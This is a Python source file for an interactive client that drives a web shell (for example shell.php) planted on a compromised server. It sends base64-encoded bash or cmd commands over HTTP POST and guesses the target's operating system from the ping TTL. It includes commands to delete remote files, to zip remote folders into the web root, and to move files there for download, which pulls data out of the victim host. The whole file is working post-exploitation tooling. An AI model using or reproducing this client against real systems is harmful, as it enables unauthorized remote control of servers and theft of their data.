import atexit
import base64
import os
import re
import readline # https://www.cnblogs.com/blitheG/p/8036630.html
import sys
import urllib.parse
import urllib.request
import requests
from queue import Queue
from threading import Thread
from time import strftime, sleep
import datetime
from zipfile import is_zipfile, ZipFile

if len(sys.argv) != 2:
    print('\nUsage: python3 {} URL\n'.format(sys.argv[0]))
    print('For example:\npython3 {} {}\n'.format(sys.argv[0], 'http://192.168.56.101/shell.php'))
    exit(0)
else:
    url = sys.argv[1]

downloads_directory = "downloads"
tar_directory = "tar"

timeout = 20
current_path = '/'
sep = "/"
dfl = []
remote_os = "posix"
historyPath = os.path.expanduser("~/.pyshellhistory")# https://blog.csdn.net/m0_46653437/article/details/111777116
if os.path.exists(historyPath):
    readline.read_history_file(historyPath)

def save_history(historyPath=historyPath):
    readline.write_history_file(historyPath)

def exit_handler():
    # save cli history
    save_history()
    # tell the thread to quit
    q.put('>>exit<<')
    # clear any colors
    print(bcolors.ENDC)


def infer_remote_os(ip):
    '''
    :param ip:
    :return:
        LINUX 64
        WIN2K/NT 128
        WINDOWS 系列 32
        UNIX 系列 255
    '''
    osname = os.name
    if osname == 'nt':
        backinfo = os.popen('ping -n 1 -w 5 %s' % ip, 'r').read()
    else:
        backinfo = os.popen('ping -c 1 -w 5 %s' % ip, 'r').read()

    result = re.findall(r"TTL=\d+", backinfo, re.IGNORECASE)
    ttl = 64
    if len(result) == 0:
        exit(0)
    else:
        ttl = (result[0]).split('=')[-1]
    # os.popen() 方法用于从一个命令打开一个管道。在Unix,Windows中有效
    if len(ttl) !=0:
        ttl = ttl
    else:
        exit(0)
    if 48 <= int(ttl) <= 64:
        remote_os = 'posix'
    elif 16 <= int(ttl) <= 32 or 110 < int(ttl) <= 128:
        remote_os = 'nt'
    elif 230 <=int(ttl) <= 255:
        remote_os = 'unix'
    else:
        remote_os = 'unknown'
    return remote_os


atexit.register(exit_handler)# atexit模块使用register函数用于注册程序退出时的回调函数。
tab_complete = {}


def complete(text, state):
    tokens = readline.get_line_buffer().split()
    thistoken = tokens[-1]
    thisdir = os.path.dirname(thistoken)
    thispath = os.path.abspath(os.path.join(current_path, thisdir))
    if thispath != '/':
        thispath += '/'
    if thispath not in tab_complete:
        populateTabComplete(thispath)
    if thispath not in tab_complete:
        return False
    suffix = [x for x in tab_complete[thispath] if x.startswith(text)][state:]
    if len(suffix):
        result = suffix[0]
        if result[-1] != '/':
            result += ' '
        return result
    return False
readline.set_completer_delims(' /;&'"")
readline.parse_and_bind('tab: complete')
readline.set_completer(complete)

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


class DownloadingFiles:
    def __init__(self, fname, fsize):
        self.fname = fname
        self.fsize = fsize
        self.progress = ''
        self.df_id = 0

    def set_progress(self, progress):
        self.progress = progress


#print ("\nuse 'settimeout 30' to set the timeout to 30 seconds, etc\n")
def tabCompleterThread():
    while True:
        path = q.get()
        if path == '>>exit<<':
            break
        populateTabComplete(path)


def populateTabComplete(path):# todo
    global tab_complete
    # entries = makeRequest(20, 'bash', '-c "cd {} && ls -p"'.format(path)).split("\n")[:-1]
    entries = makeRequest(20, 'cd ', '{}'.format(path)).split("\n")[:-1]
    # print(entries)
    if entries:
        tab_complete[path] = entries


def download(turl):
    global dfl
    try:
        fsize = urllib.request.urlopen(turl).headers['content-length']
    except:
        print("Error!")
        return
    fname = turl.split("/")[-1]
    fsize = urllib.request.urlopen(turl).headers['content-length']
    df = DownloadingFiles(fname=fname, fsize=fsize)
    df.df_id = len(dfl)
    dfl.append(df)
    response = requests.get(turl, stream=True)
    size = 0  # 初始化已下载大小
    chunk_size = 1024  # 每次下载的数据大小
    content_size = int(fsize)  # 下载文件总大小
    now = datetime.datetime.now()
    try:
        if response.status_code == 200:  # 判断是否响应成功
            # print('Start download,[File size]:{size:.2f} MB'.format(
            #     size=content_size / chunk_size / 1024))  # 开始下载，显示下载文件大小
            filepath = "/".join([downloads_directory, turl.split("/")[-1]])  # 设置图片name，注：必须加上扩展名
            with open(filepath, 'wb') as file:  # 显示进度条
               for data in response.iter_content(chunk_size=chunk_size):
                    file.write(data)
                    size += len(data)
                    df.set_progress('\r' + fname +' [下载起始时间]'+ now.strftime("%Y-%m-%d %H:%M:%S")
                                    +'   [下载进度]:%s%.2f%%' % ('>' * int(size * 50 / content_size), float(size / content_size * 100)))

    except:
        print('Error!')
    # print("length",len(dfl))
    for i in range(len(dfl)):
        # print("index",i)
        # print("df_id", df.df_id)
        try:
            if dfl[i].df_id == df.df_id:
                dfl.remove(dfl[i])
        except:
            pass


def show_downloading_files():
    global dfl
    for dl in dfl:
        print(dl.progress)


def zip_downloader(dest):
    global url
    path_to_download = sep.join([current_path.rstrip("/"), dest.lstrip("/")])
    #path_to_download = os.path.abspath(os.path.join(current_path, dest)).strip()
    filename = "." + path_to_download.replace('/', '_') + '.' + strftime("%Y%m%d%H%M%S") + '.zip'
    makeRequest(timeout, 'zip', '-r {} {}'.format("/var/www/html/"+filename, path_to_download), noDecode=True)
    param = url.rstrip(url.split("/")[-1])+filename
    ft = Thread(target=download,args=(param,))
    # ft = Process(target=download,args=(param,))
    ft.start()
    return filename


def download_folder(dest):
    tmpname = zip_downloader(dest)
    pathname = tmpname.rstrip(".zip")
    zipname = sep.join([downloads_directory,tmpname])

    while 1:
        if is_zipfile(zipname):
            break
        sleep(0.3)
    dst_dir = "tar/"+pathname
    fz = ZipFile(zipname, 'r')
    for file in fz.namelist():
        fz.extract(file, dst_dir)


def linoledit(dest):
    global current_path, url, timeout
    ip = (url.split("//")[-1]).split("/")[0]
    cmd = 'bash'
    txtname = dest.split(sep)[-1]
    opts = '-c "cd {} 2>&1 && {} 2>&1"'.format(current_path, 'mv '+dest+' /var/www/html/.'+txtname)
    result = makeRequest(timeout, cmd, opts)
    if result != '':
        print("File not exists!")
        return


q = Queue(5)
t = Thread(target=tabCompleterThread)
t.setDaemon(True)
t.start()


def run():
    global timeout
    global url, q, sep, remote_os, dfl
    global current_path
    if not os.path.exists(downloads_directory):
        os.makedirs(downloads_directory)
    if not os.path.exists(tar_directory):
        os.makedirs(tar_directory)

    def linux_run():
        global timeout
        global url, q, sep, dfl
        global current_path
        sep = '/'
        q.put('/')
        while True:
            try:
                inputstr = input('{}{} {}${} '.format(
                    bcolors.OKBLUE,
                    current_path, # todo
                    bcolors.WARNING,
                    bcolors.ENDC))
            except EOFError:
                exit_handler()
                break
            parts = inputstr.split(' ', 1)
            if len(parts) == 1:
                parts.append(' ')

            if parts[0] == 'exit':
                q.put('>>exit<<')
                break

            if parts[0] == 'cd':
                dest = parts[1]
                tmp = current_path
                if dest == ' ':
                    dest = '/'
                else:
                    if dest[0] == '/':
                        pass
                    else:
                        dest = sep.join([current_path.rstrip("/"), dest.lstrip("/")])
                    cmd = 'bash'
                    opts = '-c "cd {} 2>&1 && {} 2>&1"'.format(dest, "cd {}".format(dest).replace('"', '\\"'))
                    cdresult = makeRequest(timeout, cmd, opts)
                    if cdresult == '':
                        current_path = dest
                        cmd = 'bash'
                        opts = '-c "cd {} 2>&1 && {} 2>&1"'.format(dest,"pwd")
                        current_path = makeRequest(timeout, cmd, opts).strip()
                    else:
                        current_path = tmp
                #     'bash: line 0: cd: /sss: No such file or directory
                q.put(current_path)
                continue


            if parts[0] == 'download':
                ft = Thread(target=download,args=(parts[1],), daemon=True)
                # ft = Process(target=download, args=(parts[1],))
                ft.start()
                continue
            if parts[0] == 'downfolder':
                ft = Thread(target=download_folder,args=(parts[1],), daemon=True)
                # ft = Process(target=download, args=(parts[1],))
                ft.start()
                continue

            if parts[0] == 'get':
                zt = Thread(target=zip_downloader, args=(parts[1],), daemon=True)
                zt.start()
                # zip_older(dest)
                continue
            if parts[0] == 'settimeout':
                timeout = int(parts[1])
                print('Timeout set to {} seconds'.format(timeout))
                continue
            
            if parts[0] == 'rename':
                inputstr = inputstr.replace('rename', 'mv')

            if parts[0] == 'delete':
                inputstr = inputstr.replace('delete', 'rm -rf')

            if parts[0] == 'demonstrate':
                show_downloading_files()
                continue

            if parts[0] == 'php' or parts[0] == 'asp':
                cmd = parts[1]
                opts = ''
                makeRequest(timeout, cmd, opts)
                continue

            if parts[0] == 'oledit':
                linoledit(parts[1])
                continue

            cmd = 'bash'
            opts = '-c "cd {} 2>&1 && {} 2>&1"'.format(current_path, inputstr.replace('"', '\\"'))

            result = makeRequest(timeout, cmd, opts)
            print("{}{}".format(bcolors.ENDC, result))


    def windows_run(): # https://blog.csdn.net/appleyuchi/article/details/80143294
        global timeout
        global url, q, sep
        global current_path
        sep = '\\'
        q.put('C:\\')
        current_path = 'C:\\'
        while True:
            try:
                inputstr = input('{}{} {}${} '.format(
                    bcolors.OKBLUE,
                    current_path,
                    bcolors.WARNING,
                    bcolors.ENDC))
            except EOFError:
                exit_handler()
                break
            parts = inputstr.split(' ', 1)
            if len(parts) == 1:
                parts.append(' ')
            if parts[0] == 'exit':
                q.put('>>exit<<')
                break


            if parts[0] == 'cd':
                dest = parts[1]
                tmp = current_path
                if dest == ' ':
                    dest = '/'
                else:
                    if dest[0] == '/':
                        pass
                    else:
                        dest = sep.join([current_path.rstrip("/"), dest.lstrip("/")])
                    cmd = 'cmd '
                    opts = '/c "cd {} && {}"'.format(dest,"cd {}".format(dest).replace('"', '\\"'))
                    cdresult = makeRequest(timeout, cmd, opts)
                    if cdresult == '':
                        current_path = dest
                        cmd = 'cmd '
                        opts = '/c "cd {} && {}"'.format(dest,"chdir")
                        current_path = makeRequest(timeout, cmd, opts).strip()
                    else:
                        current_path = tmp
                #     The system cannot find the path specified.
                q.put(current_path)
                continue

            if parts[0] == 'download':
                ft = Thread(target=download,args=(parts[1],), daemon=True)
                # ft = Process(target=download, args=(parts[1],))
                ft.start()
                continue

            if parts[0] == 'get':
                print("Sorry, get is not supported on windows")
                continue

            if parts[0] == 'downfolder':
                print("Sorry, downfolder is not supported on windows")
                continue

            if parts[0] == 'settimeout':
                timeout = int(parts[1])
                print('Timeout set to {} seconds'.format(timeout))
                continue

            if parts[0] == 'rename': #syntax: rename C:\\phpstudy_pro\\WWW\\4.txt 5.txt
                inputstr = inputstr.replace('rename', 'ren')

            if parts[0] == 'delete':
                inputstr = inputstr.replace('delete', 'del')

            if parts[0] == 'demonstrate':
                show_downloading_files()

            if parts[0] == 'php' or parts[0] == 'asp':
                cmd = parts[1]
                opts = ''
                makeRequest(timeout, cmd, opts)
                continue

            # cmd = 'bash'
            # opts = '-c "cd {} 2>&1 && {} 2>&1"'.format(current_path, inputstr.replace('"', '\\"'))
            cmd = 'cmd '
            opts = '/c "cd {} && {}"'.format(current_path, inputstr.replace('"', '\\"'))
            result = makeRequest(timeout, cmd, opts)
            print("{}{}".format(bcolors.ENDC, result))


    ip = (url.split("//")[-1]).split("/")[0]
    remote_os = infer_remote_os(ip)
    if remote_os == 'posix':
        linux_run()
    else:
        windows_run()

def makeRequest(timeout, cmd, opts, noDecode=False):
    requestData = urllib.parse.urlencode({
        'timeout': timeout,
        'cmd': base64.b64encode(cmd.encode('ascii')).decode(),
        'opts': base64.b64encode(opts.encode('ascii')).decode()
    }).encode('ascii')

    result = urllib.request.urlopen(url, data=requestData).read()
    if noDecode:
        return result
    return result.decode()

run()
